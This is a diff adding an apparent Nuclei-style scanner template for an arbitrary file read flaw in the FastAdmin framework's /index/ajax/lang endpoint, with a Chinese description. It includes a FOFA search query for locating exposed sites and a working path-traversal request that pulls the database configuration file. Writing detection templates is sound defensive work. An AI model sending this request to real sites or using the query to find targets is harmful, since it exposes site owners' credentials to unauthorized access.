@@ -1,0 +1,30 @@
+id: FastAdmin-lang-File-reading
+
+info:
+  name: FastAdmin后台开发框架 lang 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="fastadmin.net" || body="<h1>fastadmin</h1>" && title="fastadmin"
+    FastAdmin后台开发框架 /index/ajax/lang 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139756211
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET  /index/ajax/lang?lang=../../application/database HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'mysql'
+          - 'sql_explain: false'
+        condition: and
+      - type: status
+        status: 
+          - 200
